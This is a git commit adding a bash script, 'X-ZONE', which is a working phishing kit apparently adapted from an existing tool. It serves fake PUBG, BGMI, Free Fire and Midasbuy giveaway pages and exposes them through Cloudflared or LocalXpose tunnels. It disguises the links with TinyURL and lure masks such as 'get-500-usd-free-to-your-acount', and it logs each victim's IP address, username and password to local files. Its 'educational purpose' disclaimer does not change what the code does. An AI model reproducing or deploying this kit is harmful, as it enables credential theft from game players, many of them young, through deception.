61c5502941b2b8cfe61af55e169def034c972473
Rabikishan Rauniyar <rabikishan.official@gmail.com>
2025-01-30 16:55:56 +0545

    X-ZONE: Upload Old project

---
+++ x-zone.sh
@@ -0,0 +1,569 @@
+##TOOL CREATED BY RABIKISHAN RAUNIYAR 
+##TOOL CREATED FOR EDUCATIONAL PURPOSE DON'T MISUSE IT AUTHOR WILL NOT BE RESPONSIBLE IF YOU MISUE IT
+
+
+__version__="1.2"
+
+## DEFAULT HOST & PORT
+HOST='127.0.0.1'
+PORT='8080' 
+
+RED="$(printf '\033[31m')"
+GREEN="$(printf '\033[32m')"
+PINK="$(printf '\033[95m')"
+BLUE="$(printf '\033[34m')"
+MAGENTA="$(printf '\033[35m')"
+CYAN="$(printf '\033[36m')"
+WHITE="$(printf '\033[37m')"
+BLACK="$(printf '\033[30m')"
+REDBG="$(printf '\033[41m')"
+GREENBG="$(printf '\033[42m')"
+PINKBG="$(printf '\033[105m')"
+BLUEBG="$(printf '\033[44m')"
+MAGENTABG="$(printf '\033[45m')"
+CYANBG="$(printf '\033[46m')"
+WHITEBG="$(printf '\033[47m')"
+BLACKBG="$(printf '\033[40m')"
+RESETBG="$(printf '\e[0m\n')"
+
+
+## Directories
+BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
+
+if [[ ! -d ".server" ]]; then
+	mkdir -p ".server"
+fi
+
+if [[ ! -d "auth" ]]; then
+	mkdir -p "auth"
+fi
+
+if [[ -d ".server/www" ]]; then
+	rm -rf ".server/www"
+	mkdir -p ".server/www"
+else
+	mkdir -p ".server/www"
+fi
+
+## Remove logfile
+if [[ -e ".server/.loclx" ]]; then
+	rm -rf ".server/.loclx"
+fi
+
+if [[ -e ".server/.cld.log" ]]; then
+	rm -rf ".server/.cld.log"
+fi
+
+## Script termination
+exit_on_signal_SIGINT() {
+	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
+	exit 0
+}
+
+exit_on_signal_SIGTERM() {
+	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
+	exit 0
+}
+
+trap exit_on_signal_SIGINT SIGINT
+trap exit_on_signal_SIGTERM SIGTERM
+
+## Reset terminal colors
+reset_color() {
+	tput sgr0   # reset attributes
+	tput op     # reset color
+	return
+}
+
+## Kill already running process
+kill_pid() {
+	check_PID="php cloudflared loclx"
+	for process in ${check_PID}; do
+		if [[ $(pidof ${process}) ]]; then # Check for Process
+			killall ${process} > /dev/null 2>&1 # Kill the Process
+		fi
+	done
+}
+
+
+
+
+## Check Internet Status
+check_status() {
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
+	timeout 3s curl -fIs "https://api.github.com" > /dev/null
+	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
+}
+
+## Banner
+banner() {
+	cat <<- EOF
+		${PINK}
+		${PINK}
+		${PINK}   _    _          _______  _____  _   _  ___   
+		${PINK}  ( )  ( )        (_____  )(  _  )( ) ( )(  _ \ 
+		${PINK}   \ \/ /  ______      / / | ( ) ||  \| || (_(_)
+		${PINK}    )  (  (______)   / /   | | | ||     ||  _)_ 
+		${PINK}   / /\ \          / / ___ | (_) || | \ || (_( )
+		${PINK}  ( )  (_)        (_______)(_____)(() (_)(____/ 
+		${PINK}  /(                              (_)           
+		${PINK} (__)                                           
+		                                                           ${RED}Version : ${__version__}
+
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} NO WAY TO ESCAPE!!!(Rabikishan Rauniyar)${WHITE}
+		
+		${GREEN}[${WHITE}-${GREEN}]${YELLOW} TOOL CREATED FOR EDUCATIONAL PURPOSE ONLY!!! ${WHITE}
+	EOF
+}
+
+## Small Banner
+banner_small() {
+	cat <<- EOF
+		${BLUE}
+		${BLUE}
+${BLUE} ██╗  ██╗    ███████╗ ██████╗ ███╗   ██╗███████╗
+${BLUE} ╚██╗██╔╝    ╚══███╔╝██╔═══██╗████╗  ██║██╔════╝
+${BLUE}  ╚███╔╝█████╗ ███╔╝ ██║   ██║██╔██╗ ██║█████╗  
+${BLUE}  ██╔██╗╚════╝███╔╝  ██║   ██║██║╚██╗██║██╔══╝  
+${BLUE} ██╔╝ ██╗    ███████╗╚██████╔╝██║ ╚████║███████╗
+${BLUE} ╚═╝  ╚═╝    ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
+                          
+                                        ${WHITE} ${__version__}
+	EOF
+}
+
+## Dependencies
+dependencies() {
+	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
+
+	if [[ -d "/data/data/com.termux/files/home" ]]; then
+		if [[ ! $(command -v proot) ]]; then
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${PINK}proot${CYAN}"${WHITE}
+			pkg install proot resolv-conf -y
+		fi
+
+		if [[ ! $(command -v tput) ]]; then
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${PINK}ncurses-utils${CYAN}"${WHITE}
+			pkg install ncurses-utils -y
+		fi
+	fi
+
+	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
+	else
+		pkgs=(php curl unzip)
+		for pkg in "${pkgs[@]}"; do
+			type -p "$pkg" &>/dev/null || {
+				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${PINK}$pkg${CYAN}"${WHITE}
+				if [[ $(command -v pkg) ]]; then
+					pkg install "$pkg" -y
+				elif [[ $(command -v apt) ]]; then
+					sudo apt install "$pkg" -y
+				elif [[ $(command -v apt-get) ]]; then
+					sudo apt-get install "$pkg" -y
+				elif [[ $(command -v pacman) ]]; then
+					sudo pacman -S "$pkg" --noconfirm
+				elif [[ $(command -v dnf) ]]; then
+					sudo dnf -y install "$pkg"
+				elif [[ $(command -v yum) ]]; then
+					sudo yum -y install "$pkg"
+				else
+					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
+					{ reset_color; exit 1; }
+				fi
+			}
+		done
+	fi
+}
+
+# Download Binaries
+download() {
+	url="$1"
+	output="$2"
+	file=`basename $url`
+	if [[ -e "$file" || -e "$output" ]]; then
+		rm -rf "$file" "$output"
+	fi
+	curl --silent --insecure --fail --retry-connrefused \
+		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"
+
+	if [[ -e "$file" ]]; then
+		if [[ ${file#*.} == "zip" ]]; then
+			unzip -qq $file > /dev/null 2>&1
+			mv -f $output .server/$output > /dev/null 2>&1
+		elif [[ ${file#*.} == "tgz" ]]; then
+			tar -zxf $file > /dev/null 2>&1
+			mv -f $output .server/$output > /dev/null 2>&1
+		else
+			mv -f $file .server/$output > /dev/null 2>&1
+		fi
+		chmod +x .server/$output > /dev/null 2>&1
+		rm -rf "$file"
+	else
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
+		{ reset_color; exit 1; }
+	fi
+}
+
+## Install Cloudflared
+install_cloudflared() {
+	if [[ -e ".server/cloudflared" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
+		else
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
+		fi
+	fi
+}
+
+## Install LocalXpose
+install_localxpose() {
+	if [[ -e ".server/loclx" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
+		else
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
+		fi
+	fi
+}
+
+## Exit message
+msg_exit() {
+	{ clear; banner; echo; }
+	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
+	{ reset_color; exit 0; }
+}
+
+## About
+about() {
+	{ clear; banner; echo; }
+	cat <<- EOF
+		${GREEN} Author   ${RED}:  ${PINK}Rabikishan Rauniyar ${RED}[ ${PINK}X-ZONE ${RED}]
+		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/Rabikishanr
+		${GREEN} Version  ${RED}:  ${PINK}${__version__}
+
+		${WHITE} ${REDBG}Warning:${RESETBG}
+		${CYAN}  This Tool is made for educational purpose 
+		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
+		  any misuse of this toolkit ${RED}!${WHITE}
+		
+		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
+		${GREEN}  (htr-tech) for main source and thank me for adding alot of phishing sites of PUBG,BGMI AND FF 🔥
+
+		${RED}[${WHITE}00${RED}]${PINK} Main Menu     ${RED}[${WHITE}99${RED}]${PINK} Exit
+
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	case $REPLY in 
+		99)
+			msg_exit;;
+		0 | 00)
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
+			{ sleep 1; main_menu; };;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; about; };;
+	esac
+}
+
+## Choose custom port
+cusport() {
+	echo
+	read -n1 -p "${RED}[${WHITE}?${RED}]${PINK} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${PINK}" P_ANS
+	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
+		echo -e "\n"
+		read -n4 -p "${RED}[${WHITE}-${RED}]${PINK} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
+		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
+			PORT=${CU_P}
+			echo
+		else
+			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
+			{ sleep 2; clear; banner_small; cusport; }
+		fi		
+	else 
+		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
+	fi
+}
+
+## Setup website and start php server
+setup_site() {
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+	cp -rf .sites/"$website"/* .server/www
+	cp -f .sites/ip.php .server/www/
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
+	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
+}
+
+## Get IP address
+capture_ip() {
+	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
+	IFS=$'\n'
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${PINK}auth/ip.txt"
+	cat .server/www/ip.txt >> auth/ip.txt
+}
+
+## Get credentials
+capture_creds() {
+	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
+	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
+	IFS=$'\n'
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${PINK}auth/usernames.dat"
+	cat .server/www/usernames.txt >> auth/usernames.dat
+	echo -ne "\n${RED}[${WHITE}-${RED}]${PINK} Waiting for Next Login Info, ${BLUE}Ctrl + C ${PINK}to exit. "
+}
+
+## Print data
+capture_data() {
+	echo -ne "\n${RED}[${WHITE}-${RED}]${PINK} Waiting for Login Info, ${BLUE}Ctrl + C ${PINK}to exit..."
+	while true; do
+		if [[ -e ".server/www/ip.txt" ]]; then
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+			capture_ip
+			rm -rf .server/www/ip.txt
+		fi
+		sleep 0.75
+		if [[ -e ".server/www/usernames.txt" ]]; then
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
+			capture_creds
+			rm -rf .server/www/usernames.txt
+		fi
+		sleep 0.75
+	done
+}
+
+## Start Cloudflared
+start_cloudflared() { 
+	rm .cld.log > /dev/null 2>&1 &
+	cusport
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; }
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+
+	if [[ `command -v termux-chroot` ]]; then
+		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+	else
+		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+	fi
+
+	sleep 8
+	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+	custom_url "$cldflr_url"
+	capture_data
+}
+
+localxpose_auth() {
+	./.server/loclx -help > /dev/null 2>&1 &
+	sleep 1
+	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
+
+	[ "$(./.server/loclx account status | grep Error)" ] && {
+		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${PINK}localxpose.io${GREEN} & copy the token\n"
+		sleep 3
+		read -p "${RED}[${WHITE}-${RED}]${PINK} Input Loclx Token :${PINK} " loclx_token
+		[[ $loclx_token == "" ]] && {
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
+		} || {
+			echo -n "$loclx_token" > $auth_f 2> /dev/null
+		}
+	}
+}
+
+## Start LocalXpose (Again...)
+start_loclx() {
+	cusport
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; localxpose_auth; }
+	echo -e "\n"
+	read -n1 -p "${RED}[${WHITE}?${RED}]${PINK} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${PINK} " opinion
+	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
+
+	if [[ `command -v termux-chroot` ]]; then
+		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+	else
+		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+	fi
+
+	sleep 12
+	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
+	custom_url "$loclx_url"
+	capture_data
+}
+
+## Start localhost
+start_localhost() {
+	cusport
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	setup_site
+	{ sleep 1; clear; banner_small; }
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
+	capture_data
+}
+
+## Tunnel selection
+tunnel_menu() {
+	{ clear; banner_small; }
+	cat <<- EOF
+
+		${RED}[${WHITE}01${RED}]${PINK} Localhost
+		${RED}[${WHITE}02${RED}]${PINK} Cloudflared  ${RED}[${CYAN}FAST🔥${RED}]
+		${RED}[${WHITE}03${RED}]${PINK} LocalXpose   ${RED}[${CYAN}Max 15Min${RED}]
+
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
+
+	case $REPLY in 
+		1 | 01)
+			start_localhost;;
+		2 | 02)
+			start_cloudflared;;
+		3 | 03)
+			start_loclx;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; tunnel_menu; };;
+	esac
+}
+
+## Custom Mask URL
+custom_mask() {
+	{ sleep .5; clear; banner_small; echo; }
+	read -n1 -p "${RED}[${WHITE}?${RED}]${PINK} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${PINK} " mask_op
+	echo
+	if [[ ${mask_op,,} == "y" ]]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${PINK}Example: https://get-free-followers.com${CYAN})\n"
+		read -e -p "${WHITE} ==> ${PINK}" -i "https://" mask_url # initial text requires Bash 4+
+		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
+			mask=$mask_url
+			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
+		else
+			echo -e "\n${RED}[${WHITE}!${RED}]${PINK} Invalid url type..Using the Default one.."
+		fi
+	fi
+}
+
+## URL Shortner
+site_stat() {
+    [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"
+}
+
+shorten() {
+    short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1")
+    processed_url=${short}
+}
+
+custom_url() {
+    url=${1#http*//}
+    tinyurl="https://tinyurl.com/api-create.php?url="
+
+    if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
+        if [[ $(site_stat $tinyurl) == 2* ]]; then
+            shorten "$tinyurl$url"
+        else
+            url="Unable to generate links. Try after turning on hotspot"
+            processed_url="Unable to Short URL"
+        fi
+
+        url="https://$url"
+        processed_url="https://$processed_url"
+    else
+        url="Unable to generate links. Try after turning on hotspot"
+        processed_url="Unable to Short URL"
+    fi
+
+    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
+    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${PINK}$processed_url"
+}
+
+
+
+## Menu
+main_menu() {
+	{ clear; banner; echo; }
+	cat <<- EOF
+		${RED}[${WHITE}1${RED}]${PINK} MUMMY-SUIT (PUBG) ${RED}[${WHITE}2${RED}]${PINK} SPIN(PUBG)   ${RED}[${WHITE}3${RED}]${PINK} X-SUIT(BGMI)
+		${RED}[${WHITE}4${RED}]${PINK} GLACIER(BGMI)     ${RED}[${WHITE}5${RED}]${PINK} FREEFIRE     ${RED}[${WHITE}6${RED}]${PINK} GLACIER(PUBG)
+		${RED}[${WHITE}7${RED}]${PINK} MIDASBUY(OLDxPUBG) ${RED}[${WHITE}8${RED}]${PINK} WRAITHFUL-EVENT       
+
+		${RED}[${WHITE}99${RED}]${PINK} About         ${RED}[${WHITE}00${RED}]${PINK} Exit
+
+	EOF
+	
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+	case $REPLY in 
+        1)
+			website="MUMMY"
+			mask='https://PUBG-FREE-GIFT-SPIN-MUMMY-SUIT'
+			tunnel_menu;;
+		2)
+			website="SPIN"
+			mask='https://unlimited-PUBG-MObile-SPIN'
+			tunnel_menu;;
+		3)
+			website="X-SUIT(BGMI)"
+			mask='https://BGMI-FREE-GIFT-SPIN-MUMMY-SUIT'
+			tunnel_menu;;
+		4)
+			website="GLACIER"
+			mask='https://BGMI-FREE-GIFT-GLACIER-SPIN-FREE'
+			tunnel_menu;;
+		5)
+			website="FREEFIRE"
+			mask='https://FREE-GIFT-COLLECT-FFMAX'
+			tunnel_menu;;
+		6)
+			website="GLACIER(PUBG)"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		7)
+			website="MIDASBUY(OLDxPUBG)"
+			mask='https://quora-premium-for-free'
+			tunnel_menu;;
+		8)
+			website="WRAITHFUL-EVENT"
+			mask='https://protonmail-pro-basics-for-free'
+			tunnel_menu;;
+		9)
+			website="NEW"
+			mask='https://protonmail-pro-basics-for-free'
+			tunnel_menu;;
+		99)
+			about;;
+		0 | 00 )
+			msg_exit;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; main_menu; };;
+	
+	esac
+}
+
+## Main
+kill_pid
+dependencies
+check_status
+install_cloudflared
+install_localxpose
+main_menu
